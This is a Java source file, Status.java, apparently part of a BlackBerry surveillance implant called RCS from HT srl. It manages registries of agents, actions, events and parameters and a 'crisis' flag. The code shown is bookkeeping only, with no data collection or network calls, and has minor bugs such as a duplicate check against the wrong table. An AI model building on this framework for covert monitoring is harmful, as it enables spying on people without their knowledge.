/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Status.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Enumeration;
import java.util.Vector;

import net.rim.device.api.util.IntHashtable;

import com.ht.rcs.blackberry.action.Action;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.params.Parameter;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Status.
 */
public final class Status implements Singleton {

    /** The debug. */
    private static Debug debug = new Debug("Status", DebugLevel.VERBOSE);

    /** The agents. */
    IntHashtable agents;

    /** The actions. */
    IntHashtable actions;

    /** The events. */
    IntHashtable events;

    /** The parameters. */
    IntHashtable parameters;

    /** The instance. */
    private static Status instance = null;

    /**
     * Gets the single instance of Status.
     * 
     * @return single instance of Status
     */
    public static synchronized Status getInstance() {
        if (instance == null) {
            instance = new Status();
        }

        return instance;
    }

    // Debug debug=new Debug("Status");

    /** The crisis. */
    private boolean crisis = false;

    /**
     * Instantiates a new status.
     */
    private Status() {
        agents = new IntHashtable(15);
        actions = new IntHashtable(10);
        events = new IntHashtable(10);
        parameters = new IntHashtable(5);
    }

    /**
     * Adds the action.
     * 
     * @param action
     *            the action
     */
    public synchronized void addAction(Action action) {

        Check.requires(actions != null, "Null actions");
        Check.requires(action != null, "Null action");
        Check.requires(action.actionId >= 0, "actionId == " + action.actionId);

        Check.asserts(actions.containsKey(action.actionId) == false,
                "Action already present: " + action);

        actions.put(action.actionId, action);

        Check.ensures(actions.containsKey(action.actionId),
                "Action not inserted: " + action);
    }

    /**
     * Adds the agent.
     * 
     * @param agent
     *            the agent
     */
    public synchronized void addAgent(Agent agent) {
        if (agent == null) {
            debug.error("Status.java - AddAgent NULL");
            return;
        }

        Check.requires(agents != null, "Null Agents");
        Check.requires(agent != null, "Null Agent");
        Check.requires(agent.agentId >= 0, "AgentId == " + agent.agentId);

        Check.asserts(agents.containsKey(agent.agentId) == false,
                "Agent already present: " + agent);

        agents.put(agent.agentId, agent);

        debug.trace("Agent added:" + agent);

        Check.ensures(agents.containsKey(agent.agentId), "Agent not inserted: "
                + agent);
    }

    /**
     * Adds the event.
     * 
     * @param eventId_
     *            the event id
     * @param event
     *            the event
     */
    public synchronized void addEvent(int eventId_, Event event) {

        Check.requires(events != null, "Null Events");
        Check.requires(event != null, "Null Event");
        Check.requires(eventId_ >= 0, "EventId == " + eventId_);

        Check.asserts(events.containsKey(eventId_) == false,
                "Event already present: " + event);

        event.eventId = eventId_;
        events.put(eventId_, event);

        Check.ensures(events.containsKey(eventId_), "Event not inserted: "
                + event);
    }

    /**
     * Adds the parameter.
     * 
     * @param parameter
     *            the parameter
     */
    public synchronized void addParameter(Parameter parameter) {
        Check.requires(parameters != null, "Null parameters");
        Check.requires(parameter != null, "Null parameter");
        Check.requires(parameter.parameterId >= 0, "ParameterId == "
                + parameter.parameterId);

        Check.asserts(actions.containsKey(parameter.parameterId) == false,
                "Parameter already present: " + parameter);

        parameters.put(parameter.parameterId, parameter);

        Check.ensures(parameters.containsKey(parameter.parameterId),
                "Parameter not inserted: " + parameter);

    }

    /**
     * Agent alive.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean agentAlive(int agentId) {

        Agent agent = getAgent(agentId);

        if (agent == null) {
            debug.error("AgentAlive FAILED");
            return false;
        }

        agent.agentStatus = Common.AGENT_RUNNING;
        return true;

    }

    /**
     * Agent check and stop.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean agentCheckAndStop(int agentId) {
        Agent agent = getAgent(agentId);

        if (agent == null || agent.command != Common.AGENT_STOP) {
            debug.error("AgentCheckAndStop FAILED");
            return false;
        }

        agent.agentStatus = Common.AGENT_STOPPED;
        agent.command = Common.NO_COMMAND;
        return true;
    }

    /**
     * Agent query status.
     * 
     * @param agentId
     *            the agent id
     * @return the int
     */
    public synchronized int agentQueryStatus(int agentId) {

        Agent agent = getAgent(agentId);

        if (agent == null) {
            return 0;
        }

        return agent.agentStatus;
    }

    /**
     * Agent query stop.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean agentQueryStop(int agentId) {
        Agent agent = getAgent(agentId);

        if (agent == null || agent.command != Common.AGENT_STOP) {
            return false;
        }

        return true;
    }

    /**
     * Clear.
     */
    public void clear() {
        debug.info("Clear");

        agents.clear();
        actions.clear();
        events.clear();
        parameters.clear();
    }

    /**
     * Count enabled agents.
     * 
     * @return the int
     */
    public synchronized int countEnabledAgents() {
        int enabled = 0;
        Enumeration e = agents.elements();

        while (e.hasMoreElements()) {
            Agent agent = (Agent) e.nextElement();

            if (agent.agentStatus == Common.AGENT_ENABLED) {
                enabled++;
            }
        }

        return enabled;
    }

    /**
     * Crisis.
     * 
     * @return true, if successful
     */
    public synchronized boolean crisis() {

        return crisis;
    }

    /**
     * Gets the actions list.
     * 
     * @return the vector
     */
    public synchronized Vector getActionsList() {
        Check.requires(actions != null, "Null actions");

        Enumeration e = actions.elements();
        Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        Check.ensures(actions.size() == vect.size(),
                "actions not equal to vect");
        return vect;
    }

    /**
     * Gets the agent.
     * 
     * @param agentId
     *            the agent id
     * @return the agent
     */
    public synchronized Agent getAgent(int agentId) {
        if (agents.containsKey(agentId)) {
            Agent agent = (Agent) agents.get(agentId);

            Check.ensures(agent.agentId == agentId, "not equal agentId");
            return agent;
        } else {
            debug.error("Agents don't contain type " + agentId);
            return null;
        }
    }

    /**
     * Gets the agents list.
     * 
     * @return the vector
     */
    public synchronized Vector getAgentsList() {
        Check.requires(agents != null, "Null Agents");

        Enumeration e = agents.elements();
        Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        Check.ensures(agents.size() == vect.size(), "agents not equal to vect");
        return vect;
    }

    /**
     * Gets the event.
     * 
     * @param eventId
     *            the event id
     * @return the event
     */
    public synchronized Event getEvent(int eventId) {
        if (events.containsKey(eventId)) {
            Event event = (Event) events.get(eventId);

            Check.ensures(event.eventId == eventId, "not equal eventId");
            return event;
        } else {
            debug.error("Events don't contain type " + eventId);
            return null;
        }
    }

    /**
     * Gets the events list.
     * 
     * @return the vector
     */
    public synchronized Vector getEventsList() {
        Check.requires(events != null, "Null Events");

        Enumeration e = events.elements();
        Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        Check.ensures(events.size() == vect.size(), "events not equal to vect");
        return vect;
    }

    /**
     * Gets the parameters list.
     * 
     * @return the vector
     */
    public synchronized Vector getParametersList() {
        Check.requires(parameters != null, "Null parameters");

        Enumeration e = parameters.elements();
        Vector vect = new Vector();

        while (e.hasMoreElements()) {
            vect.addElement(e.nextElement());
        }

        Check.ensures(parameters.size() == vect.size(),
                "parameters not equal to vect");
        return vect;
    }

    /**
     * Checks if is valid agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if is valid agent
     */
    public synchronized boolean isValidAgent(int agentId) {
        return agents.containsKey(agentId);
    }

    /**
     * Checks if is valid event.
     * 
     * @param eventId
     *            the event id
     * @return true, if is valid event
     */
    public synchronized boolean isValidEvent(int eventId) {
        return events.containsKey(eventId);
    }

    /**
     * Re enable agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean reEnableAgent(int agentId) {
        Agent agent = getAgent(agentId);

        if (agent == null || agent.agentStatus != Common.AGENT_STOPPED) {
            // debug.Error("Wrong agent " + agent);
            return false;
        }

        debug.trace("ReEnabling " + agent);
        agent.agentStatus = Common.AGENT_ENABLED;
        return true;
    }

    /**
     * Re enable agents.
     * 
     * @return true, if successful
     */
    public synchronized boolean reEnableAgents() {
        Enumeration e = agents.elements();

        while (e.hasMoreElements()) {
            Agent agent = (Agent) e.nextElement();
            reEnableAgent(agent.agentId);
        }

        return true;
    }

    /**
     * Start crisis.
     */
    public synchronized void startCrisis() {
        crisis = true;
    }

    /**
     * Stop agent.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean stopAgent(int agentId) {

        Agent agent = getAgent(agentId);

        if (agent == null || agent.agentStatus != Common.AGENT_RUNNING) {
            debug.error("Wrong agent " + agent);
            return false;
        }

        debug.trace("Stopping " + agent);
        agent.command = Common.AGENT_STOP;
        return true;

    }

    /**
     * Stop agents.
     */
    public synchronized void stopAgents() {

        Enumeration e = agents.elements();

        while (e.hasMoreElements()) {
            Agent agent = (Agent) e.nextElement();

            if (agent.agentStatus == Common.AGENT_RUNNING) {
                agent.command = Common.AGENT_STOP;
            }
        }

    }

    /**
     * Stop crisis.
     */
    public synchronized void stopCrisis() {
        crisis = false;
    }

    /**
     * Stop event.
     * 
     * @param eventId
     *            the event id
     * @return true, if successful
     */
    public boolean stopEvent(int eventId) {
        Event event = getEvent(eventId);

        if (event != null) {
            event.stop();
        }

        try {
            event.join();
        } catch (InterruptedException e) {
            debug.error("Interrupted");
        }

        return true;
    }

    /**
     * Thread agent stopped.
     * 
     * @param agentId
     *            the agent id
     * @return true, if successful
     */
    public synchronized boolean threadAgentStopped(int agentId) {

        Agent agent = getAgent(agentId);

        if (agent == null) {
            debug.error("ThreadAgentStopped FAILED");
            return false;
        }

        agent.agentStatus = Common.AGENT_STOPPED;
        agent.command = Common.NO_COMMAND;

        return true;
    }

    /**
     * Trigger action.
     * 
     * @param actionId
     *            the action id
     * @return true, if successful
     */
    public synchronized boolean triggerAction(int actionId) {
        debug.trace("TriggerAction:" + actionId);

        if (actions.containsKey(actionId)) {
            Action action = (Action) actions.get(actionId);
            action.setTriggered(true);
            return true;
        } else {
            debug.error("TriggerAction FAILED " + actionId);
            return false;
        }
    }

}
